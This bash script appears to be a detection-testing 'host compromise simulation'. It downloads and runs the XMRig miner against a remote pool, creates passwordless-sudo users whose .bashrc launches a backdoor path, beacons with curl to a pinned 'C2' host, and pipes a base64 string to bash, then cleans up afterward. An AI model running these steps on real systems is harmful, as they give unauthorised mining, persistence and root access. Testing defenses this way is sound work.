#!/usr/bin/env bash
set -euo pipefail

echo "[*] Starting host compromise simulation (Beginner-Friendly Version)"

# === Basic Settings ===
TMP_DIR="/tmp/xmrig-sim"      # Temporary directory for miner files
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz"
USER_PREFIX="demo_eviluser"   # Prefix for fake user accounts
USER_COUNT=5                  # Number of fake users to create
BACKDOOR_FILE="/usr/bin/.openbackdoor"  # Simulated malicious binary path
declare -a CREATED_USERS      # Array to store added usernames

# === 1. Download and run a known miner binary ===
download_xmrig() {
  if [ ! -f /tmp/xmrig-demo ]; then
    echo "[1] Downloading XMRig to /tmp/xmrig-demo..."
    curl -sL "$XMRIG_URL" -o /tmp/xmrig.tar.gz
    mkdir -p "$TMP_DIR"
    tar -xvzf /tmp/xmrig.tar.gz -C "$TMP_DIR"
    mv "$TMP_DIR"/xmrig-*/xmrig /tmp/xmrig-demo
    chmod +x /tmp/xmrig-demo
    rm -rf "$TMP_DIR" /tmp/xmrig.tar.gz
  else
    echo "[1] XMRig already exists at /tmp/xmrig-demo"
  fi

  echo "[1] Running XMRig (simulated miner activity)..."
  /tmp/xmrig-demo --url=donate.v2.xmrig.com:3333 --user=localtest --donate-level=0 --tls=false &
}

# === 2. Add fake privileged users ===
add_privileged_users() {
  echo "[2] Creating $USER_COUNT fake users with sudo access..."
  for i in $(seq 1 $USER_COUNT); do
    user="${USER_PREFIX}_$((RANDOM % 10000))"
    CREATED_USERS+=("$user")
    echo "  [+] Adding user: $user"

    sudo useradd -m -s /bin/bash "$user"
    echo "$user ALL=(ALL) NOPASSWD:ALL" | sudo tee "/etc/sudoers.d/$user" > /dev/null

    sudo -u "$user" bash -c "touch ~/.bashrc"
    echo "$BACKDOOR_FILE &" | sudo tee -a "/home/$user/.bashrc" > /dev/null
    sudo chown "$user:$user" "/home/$user/.bashrc"
  done
}

# === 3. Simulate connections to fake C2 server ===
simulate_c2_connection() {
  local C2_HOST="metasploit.com"
  local C2_PORT=9999
  local C2_IP="172.31.37.105"
  local DURATION=300  # total time to run in seconds

  echo "[3] Simulating fake C2 callbacks to $C2_HOST:$C2_PORT with random intervals for $DURATION seconds..."

  local START_TIME
  START_TIME=$(date +%s)

  while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED=$((CURRENT_TIME - START_TIME))

    if (( ELAPSED >= DURATION )); then
      echo "  [✔] C2 simulation completed after $DURATION seconds."
      break
    fi

    echo "  [>] Sending simulated C2 callback at $(date +%T)..."
    curl -s "http://$C2_HOST" --resolve "$C2_HOST:$C2_PORT:$C2_IP" || true

    # Generate a random sleep interval between 3 and 15 seconds
    SLEEP_TIME=$((RANDOM % 13 + 3))
    echo "  [i] Sleeping for $SLEEP_TIME seconds..."
    sleep "$SLEEP_TIME"
  done
}


# === 4. Run a suspicious-looking base64 command ===
run_base64_payload() {
  echo "[4] Running a suspicious base64-encoded command..."
  echo "ZWNobyAiU3VzcGljaW91cyBhY3Rpdml0eSBleGVjdXRlZCIK" | base64 -d | bash
}

# === 5. Cleanup Function to Undo Simulation Changes ===
cleanup_simulation() {
  echo "[5] Cleaning up simulation artifacts..."

  # Stop XMRig miner
  echo "  [-] Stopping XMRig miner..."
  pkill -f xmrig || echo "    [i] No XMRig process found."

  # Delete created users and sudoers files
  echo "  [-] Removing created users..."
  for user in "${CREATED_USERS[@]}"; do
    echo "    [-] Deleting user: $user"
    sudo userdel -r "$user" 2>/dev/null || echo "      [!] Failed to delete $user"
    sudo rm -f "/etc/sudoers.d/$user"
  done

  # Remove XMRig binary and backdoor
  echo "  [-] Deleting XMRig binary and backdoor file..."
  sudo rm -f /tmp/xmrig-demo
  sudo rm -f "$BACKDOOR_FILE"

  echo "[✔] Cleanup completed successfully."
}


# === Run All Steps ===

download_xmrig
add_privileged_users
simulate_c2_connection
run_base64_payload
sleep 600

echo "Attack Simulation terminating, cleaning up..."
sleep 5
echo
cleanup_simulation
echo 
sleep 5
echo "Host cleanup done"
